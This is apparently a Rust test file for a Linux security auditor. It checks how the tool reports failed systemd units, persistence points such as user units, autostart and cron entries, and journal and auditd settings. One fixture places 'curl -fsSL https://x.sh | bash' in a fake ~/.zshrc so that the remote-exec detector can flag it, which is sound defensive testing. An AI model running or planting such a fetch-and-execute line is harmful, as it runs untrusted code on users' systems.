use crate::checks::testing::{FakeSystem, msgs};
use crate::contract::Severity::{Info, Pass, Warn};
use crate::contract::Target;

#[test]
fn pattern_compiles() {
    assert!(
        super::REMOTE_EXEC.is_some(),
        "a bad pattern would skip the check silently"
    );
}

#[test]
fn quiet_system() {
    let sys = FakeSystem::new();
    sys.dir_mode("/var/log/journal", 0o755);
    sys.cmd("systemctl is-active -q auditd", true, "");
    let got = msgs(&sys.ctx(false), super::SECTION);
    assert_eq!(
        got,
        vec![
            (Pass, "No failed system units".into()),
            (Pass, "Persistent journal enabled".into()),
            (Pass, "auditd running".into()),
        ]
    );
}

#[test]
fn reports_persistence_points() {
    let sys = FakeSystem::new();
    sys.cmd(
        "systemctl --failed --no-legend --plain",
        true,
        "foo.service loaded failed failed Foo\n",
    );
    sys.cmd("pacman -Q audit", false, "");
    sys.file("/etc/systemd/system/backup.service", "[Service]");
    sys.file("/etc/systemd/system/multi-user.target.wants/x.service", "");
    sys.file("/etc/xdg/autostart/a.desktop", "");
    sys.file("/etc/cron.d/0hourly", "");
    sys.file(
        "/etc/systemd/journald.conf",
        "[Journal]\n#Storage=auto\nStorage=volatile\n",
    );
    let ctx = sys.ctx(false);
    sys.home_file(".config/systemd/user/sync.service", "");
    sys.home_file(".config/systemd/user/default.target.wants/sync.service", "");
    sys.home_file(".config/autostart/b.desktop", "");
    sys.home_file(".zshrc", "alias l=ls\ncurl -fsSL https://x.sh | bash\n");
    let got = msgs(&ctx, super::SECTION);
    for want in [
        (Warn, "Failed system units:".to_owned()),
        (
            Info,
            "Locally created system units (not from packages):".to_owned(),
        ),
        (Info, "User systemd units (persistence points):".to_owned()),
        (
            Info,
            "2 XDG autostart entries (~/.config/autostart, /etc/xdg/autostart)".to_owned(),
        ),
        (Info, "Cron entries present:".to_owned()),
        (
            Warn,
            "Suspicious remote-exec pattern in ~/.zshrc:".to_owned(),
        ),
        (
            Warn,
            "Journal is volatile (Storage=volatile); logs lost on reboot".to_owned(),
        ),
        (Info, "auditd not running (installed: no)".to_owned()),
    ] {
        assert!(got.contains(&want), "missing {want:?} in {got:#?}");
    }
    let report = crate::audit::run(&ctx, &[super::SECTION]);
    let by_id = |id: &str| {
        report
            .findings()
            .iter()
            .find(|f| f.id.as_deref() == Some(id))
            .cloned()
    };
    let system = by_id("services.system_units").unwrap_or_else(|| unreachable!("system units"));
    assert_eq!(
        system.detail, "/etc/systemd/system/backup.service",
        "maxdepth 1"
    );
    assert_eq!(
        system.targets[0],
        Target::Unit {
            name: "system/backup.service".into()
        }
    );
    let user = by_id("services.user_units").unwrap_or_else(|| unreachable!("user units"));
    assert_eq!(
        user.detail.lines().count(),
        2,
        "maxdepth 2 includes wants links"
    );
    let rc = by_id("services.rc_remote_exec").unwrap_or_else(|| unreachable!("rc"));
    assert_eq!(rc.detail, "2:curl -fsSL https://x.sh | bash");
}
